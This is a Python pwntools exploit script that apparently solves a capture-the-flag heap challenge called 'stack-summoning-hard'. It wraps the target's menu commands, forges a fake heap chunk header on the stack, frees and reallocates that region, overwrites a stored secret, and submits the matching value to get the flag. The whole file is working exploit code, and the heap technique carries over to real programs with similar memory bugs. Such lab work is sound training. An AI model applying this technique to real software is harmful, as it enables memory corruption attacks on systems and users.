#!/usr/bin/python3

from pwn import *
import re


context.arch = "amd64"
context.log_level == "error"

elf = context.binary = ELF("/challenge/stack-summoning-hard")

def malloc(io,index,size):
    payload = b"malloc "+str(index).encode() + b" " + str(size).encode()
    io.sendline(payload)
    return io

def echo(io,index,offset):
    payload  = b"echo "+ str(index).encode() + b" " + str(offset).encode()
    io.sendline(payload)
    return io

def free(io,index):
    payload = b"free " + str(index).encode()
    io.sendline(payload)
    return io

def puts(io,index):
    payload = b"puts " + str(index).encode()
    io.sendline(payload)
    return io

def scanf(io,index,data):
    payload = b"scanf "+ str(index).encode() + b" " + data
    io.sendline(payload)
    return io

def quit(io):
    io.sendline(b"quit")
    return io

def stack_free(io):
    io.sendline(b"stack_free")
    return io

def stack_scanf(io,data):
    payload = b"stack_scanf " + data
    io.sendline(payload)
    return io

def stack_malloc_win(io):
    io.sendline(b"stack_malloc_win")
    return io

def send_flag(io,secret):
    payload = b"send_flag " + secret
    io.sendline(payload)
    return io

def control_flow():
    rbp = 0x7fff12121212
    free_add = rbp - 0x1a0 + 0x40
    input_stack_add = rbp - 0x1a0
    secret_add = rbp - 0xa4
    stack_input_to_free_distance = free_add - input_stack_add

    io = process()
    payload = b"a" * (stack_input_to_free_distance - 0x10) + b"\x00" * 8 + p64(0x101) 
    io = stack_scanf(io,payload)
    io = stack_free(io)
    io = malloc(io,0,0xf0)
    payload = b"a" * (secret_add - free_add) + b"a" * 16
    io = free(io,0)
    io = scanf(io,0,payload)
    io = send_flag(io,b"a" * 16)
    io.interactive()


control_flow()
